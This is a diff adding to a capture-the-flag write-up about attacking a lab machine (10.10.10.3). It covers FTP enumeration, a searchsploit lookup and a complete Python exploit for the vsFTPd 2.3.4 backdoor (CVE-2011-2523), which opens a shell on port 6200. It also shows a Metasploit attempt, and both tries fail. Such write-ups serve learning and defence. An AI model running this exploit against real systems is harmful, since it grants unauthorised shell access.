@@ -62,7 +62,100 @@ Host script results:
 **Important things to notice:**
 - ftp is running on port 21. 
     - Anonymous login is allowed.
-    - vsFTPd 2.3.4
+    - vsFTPd 2.3.4 
 - ssh on port 22 (as usual)
 - samba on 139 and 445
+    - smbd 3.0.20-Debian
 
+I would always keep ssh on the bottom of my list to enumerate because generally you don't get vulnerable points in SSH. So let's begin with ftp(port 21).
+
+We have anonymous login enabled. Let's check it:
+
+
+
+```bash
+┌──(cyb3ritic㉿kali)-[~/Downloads]
+└─$ searchsploit vsFTPd 2.3.4                          
+----------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                               |  Path
+----------------------------------------------------------------------------- ---------------------------------
+vsftpd 2.3.4 - Backdoor Command Execution                                    | unix/remote/49757.py
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                       | unix/remote/17491.rb
+----------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+
+Here we got two exploits for the given ftp version, let's see what gets us to the treasure...
+
+Just googling on the first exploit, I got this exploit:
+```python
+# Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution
+# Date: 9-04-2021
+# Exploit Author: HerculesRD
+# Software Link: http://www.linuxfromscratch.org/~thomasp/blfs-book-xsl/server/vsftpd.html
+# Version: vsftpd 2.3.4
+# Tested on: debian
+# CVE : CVE-2011-2523
+
+#!/usr/bin/python3   
+                                                           
+from telnetlib import Telnet 
+import argparse
+from signal import signal, SIGINT
+from sys import exit
+
+def handler(signal_received, frame):
+    # Handle any cleanup here
+    print('   [+]Exiting...')
+    exit(0)
+
+signal(SIGINT, handler)                           
+parser=argparse.ArgumentParser()        
+parser.add_argument("host", help="input the address of the vulnerable host", type=str)
+args = parser.parse_args()       
+host = args.host                        
+portFTP = 21 #if necessary edit this line
+
+user="USER nergal:)"
+password="PASS pass"
+
+tn=Telnet(host, portFTP)
+tn.read_until(b"(vsFTPd 2.3.4)") #if necessary, edit this line
+tn.write(user.encode('ascii') + b"\n")
+tn.read_until(b"password.") #if necessary, edit this line
+tn.write(password.encode('ascii') + b"\n")
+
+tn2=Telnet(host, 6200)
+print('Success, shell opened')
+print('Send `exit` to quit shell')
+tn2.interact()
+```
+
+Let's try to run this exploit. And a badluck, it didn't work.🥲
+But no worries, we still got one exploit left in our quiever. Let's give it a try.
+
+```bash
+msf6 > search vsftpd 2.3.4
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
+
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor 
+[*] Using configured payload cmd/unix/interact
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST 10.10.10.3
+RHOST => 10.10.10.3
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+
+[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 10.10.10.3:21 - USER: 331 Please specify the password.
+[*] Exploit completed, but no session was created.
+```
+
+Nope, couldn't catch a fish.
